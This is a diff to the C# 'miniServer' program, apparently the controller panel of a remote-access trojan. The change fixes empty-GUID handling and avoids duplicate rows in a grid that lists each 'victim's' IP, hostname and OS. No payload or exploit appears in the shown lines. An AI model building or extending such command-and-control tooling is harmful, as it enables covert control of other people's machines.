@@ -140,7 +140,7 @@ namespace miniServer
             {
                 Guid Id ;
                 bool _isValidClientId = Guid.TryParse(ClientIdString,out Id);
-                if (!_isValidClientId)
+                if (!_isValidClientId || Id==Guid.Empty)
                     Id = Guid.NewGuid();
                 mc = new miniClient(Id, tcpClient, os, version, hostName);
                 clientList.Add(mc);
@@ -155,18 +155,6 @@ namespace miniServer
             //Hello is for future use
             mc.SendToClient(mc.ID.ToString() + separator + "Hello");
 
-            //ADD new client to datagridview
-            DataGridViewRow row = new DataGridViewRow();
-            row.CreateCells(dataGridViewClients);
-            //TODO:IP country Flag
-            row.Cells[0].Value = getFlagOfIP(mc.IP);//getFlagOfIP(mc.IP);//IP country Flag
-            row.Cells[1].Value = mc.ID;//ID
-                                       //Note is emty
-            row.Cells[3].Value = mc.IP;//Victim IP and Port
-            row.Cells[4].Value = mc.HostName;//Victim HostName
-            row.Cells[5].Value = mc.OS;//Victim OS version
-            row.Cells[6].Value = mc.Version;//Client Version
-            row.Cells[7].Value = "Yes";//isAlive
             string ConnectionStatus=string.Empty;
             gridMutex.WaitOne();
             dataGridViewClients.Invoke((MethodInvoker)delegate
@@ -174,6 +162,18 @@ namespace miniServer
                 var existRow = dataGridViewClients.Rows.Cast<DataGridViewRow>().Where(r => r.Cells[1].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault();
                 if (existRow == null)
                 {
+                    //ADD new client to datagridview
+                    DataGridViewRow row = new DataGridViewRow();
+                    row.CreateCells(dataGridViewClients);
+                    //TODO:IP country Flag
+                    row.Cells[0].Value = getFlagOfIP(mc.IP);//getFlagOfIP(mc.IP);//IP country Flag
+                    row.Cells[1].Value = mc.ID;//ID
+                                               //Note is emty
+                    row.Cells[3].Value = mc.IP;//Victim IP and Port
+                    row.Cells[4].Value = mc.HostName;//Victim HostName
+                    row.Cells[5].Value = mc.OS;//Victim OS version
+                    row.Cells[6].Value = mc.Version;//Client Version
+                    row.Cells[7].Value = "Yes";//isAlive
                     dataGridViewClients.Rows.Add(row);
                     ConnectionStatus = "Connected";
                 }
